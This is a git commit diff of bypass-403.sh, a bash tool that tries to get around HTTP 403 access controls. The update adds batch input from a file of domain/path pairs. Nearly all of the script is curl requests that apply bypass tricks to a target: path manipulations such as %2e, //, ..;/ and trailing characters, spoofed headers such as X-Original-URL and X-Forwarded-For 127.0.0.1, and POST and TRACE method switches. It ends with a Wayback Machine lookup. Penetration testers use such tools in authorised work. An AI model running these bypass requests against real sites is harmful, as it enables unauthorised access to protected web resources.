ae06ad1f3fd986ed8072d0e0ce59f883b78a2acf
0xab <97664456+0xab01@users.noreply.github.com>
2024-05-30 20:37:37 +0530

    Update bypass-403.sh
    Added file support , simply use 
    
    bypass4-403.sh /path/to/the/file

--- bypass-403.sh
+++ bypass-403.sh
@@ -1,61 +1,109 @@
-#! /bin/bash
+#!/bin/bash
+
 figlet Bypass-403
 echo "                                               By Iam_J0ker"
-echo "./bypass-403.sh https://example.com path"
+echo "./bypass-403.sh input_file"
 echo " "
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2
-echo "  --> ${1}/${2}"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/%2e/$2
-echo "  --> ${1}/%2e/${2}"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/.
-echo "  --> ${1}/${2}/."
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1//$2//
-echo "  --> ${1}//${2}//"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/./$2/./
-echo "  --> ${1}/./${2}/./"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Original-URL: $2" $1/$2
-echo "  --> ${1}/${2} -H X-Original-URL: ${2}"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Custom-IP-Authorization: 127.0.0.1" $1/$2
-echo "  --> ${1}/${2} -H X-Custom-IP-Authorization: 127.0.0.1"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: http://127.0.0.1" $1/$2
-echo "  --> ${1}/${2} -H X-Forwarded-For: http://127.0.0.1"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: 127.0.0.1:80" $1/$2
-echo "  --> ${1}/${2} -H X-Forwarded-For: 127.0.0.1:80"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-rewrite-url: $2" $1
-echo "  --> ${1} -H X-rewrite-url: ${2}"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2%20
-echo "  --> ${1}/${2}%20"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2%09
-echo "  --> ${1}/${2}%09"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2?
-echo "  --> ${1}/${2}?"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.html
-echo "  --> ${1}/${2}.html"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/?anything
-echo "  --> ${1}/${2}/?anything"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2#
-echo "  --> ${1}/${2}#"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Content-Length:0" -X POST $1/$2
-echo "  --> ${1}/${2} -H Content-Length:0 -X POST"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/*
-echo "  --> ${1}/${2}/*"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.php
-echo "  --> ${1}/${2}.php"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.json
-echo "  --> ${1}/${2}.json"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X TRACE $1/$2
-echo "  --> ${1}/${2}  -X TRACE"
-curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Host: 127.0.0.1" $1/$2
-echo "  --> ${1}/${2} -H X-Host: 127.0.0.1"
-curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2..;/"
-echo "  --> ${1}/${2}..;/"
-curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" " $1/$2;/"
-echo "  --> ${1}/${2};/"
-#updated
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X TRACE $1/$2
-echo "  --> ${1}/${2} -X TRACE"
-curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-Host: 127.0.0.1" $1/$2
-echo "  --> ${1}/${2} -H X-Forwarded-Host: 127.0.0.1"
-echo "Way back machine:"
-curl -s  https://archive.org/wayback/available?url=$1/$2 | jq -r '.archived_snapshots.closest | {available, url}'
 
+# Function to perform all the bypass techniques
+perform_bypass() {
+    local domain=$1
+    local path=$2
+
+    echo "Testing ${domain}/${path}"
+    
+    curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" $domain/$path
+    echo "  --> ${domain}/${path}"
+    
+    curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" $domain/%2e/$path
+    echo "  --> ${domain}/%2e/${path}"
+    
+    curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" $domain/$path/.
+    echo "  --> ${domain}/${path}/."
+    
+    curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" $domain//$path//
+    echo "  --> ${domain}//${path}//"
+    
+    curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" $domain/./$path/./
+    echo "  --> ${domain}/./${path}/./"
+    
+    curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" -H "X-Original-URL: $path" $domain/$path
+    echo "  --> ${domain}/${path} -H X-Original-URL: ${path}"
+    
+    curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" -H "X-Custom-IP-Authorization: 127.0.0.1" $domain/$path
+    echo "  --> ${domain}/${path} -H X-Custom-IP-Authorization: 127.0.0.1"
+    
+    curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" -H "X-Forwarded-For: http://127.0.0.1" $domain/$path
+    echo "  --> ${domain}/${path} -H X-Forwarded-For: http://127.0.0.1"
+    
+    curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" -H "X-Forwarded-For: 127.0.0.1:80" $domain/$path
+    echo "  --> ${domain}/${path} -H X-Forwarded-For: 127.0.0.1:80"
+    
+    curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" -H "X-rewrite-url: $path" $domain
+    echo "  --> ${domain} -H X-rewrite-url: ${path}"
+    
+    curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" $domain/$path%20
+    echo "  --> ${domain}/${path}%20"
+    
+    curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" $domain/$path%09
+    echo "  --> ${domain}/${path}%09"
+    
+    curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" $domain/$path?
+    echo "  --> ${domain}/${path}?"
+    
+    curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" $domain/$path.html
+    echo "  --> ${domain}/${path}.html"
+    
+    curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" $domain/$path/?anything
+    echo "  --> ${domain}/${path}/?anything"
+    
+    curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" $domain/$path#
+    echo "  --> ${domain}/${path}#"
+    
+    curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" -H "Content-Length:0" -X POST $domain/$path
+    echo "  --> ${domain}/${path} -H Content-Length:0 -X POST"
+    
+    curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" $domain/$path/*
+    echo "  --> ${domain}/${path}/*"
+    
+    curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" $domain/$path.php
+    echo "  --> ${domain}/${path}.php"
+    
+    curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" $domain/$path.json
+    echo "  --> ${domain}/${path}.json"
+    
+    curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" -X TRACE $domain/$path
+    echo "  --> ${domain}/${path} -X TRACE"
+    
+    curl -s -o /dev/null -iL -w "%{http_code},%{size_download}" -H "X-Host: 127.0.0.1" $domain/$path
+    echo "  --> ${domain}/${path} -H X-Host: 127.0.0.1"
+    
+    curl -s -o /dev/null -iL -w "%{http_code},%{size_download}" "$domain/$path..;/"
+    echo "  --> ${domain}/${path}..;/"
+    
+    curl -s -o /dev/null -iL -w "%{http_code},%{size_download}" "$domain/$path;/"
+    echo "  --> ${domain}/${path};/"
+    
+    curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" -X TRACE $domain/$path
+    echo "  --> ${domain}/${path} -X TRACE"
+    
+    curl -s -o /dev/null -iL -w "%{http_code},%{size_download}" -H "X-Forwarded-Host: 127.0.0.1" $domain/$path
+    echo "  --> ${domain}/${path} -H X-Forwarded-Host: 127.0.0.1"
+
+    echo "Way back machine:"
+    curl -s https://archive.org/wayback/available?url=$domain/$path | jq -r '.archived_snapshots.closest | {available, url}'
+}
+
+# Main script
+if [ "$#" -ne 1 ]; then
+    echo "Usage: $0 input_file"
+    exit 1
+fi
+
+input_file=$1
+
+while IFS= read -r line; do
+    domain=$(echo $line | awk '{print $1}')
+    path=$(echo $line | awk '{print $2}')
+    perform_bypass $domain $path
+done < $input_file
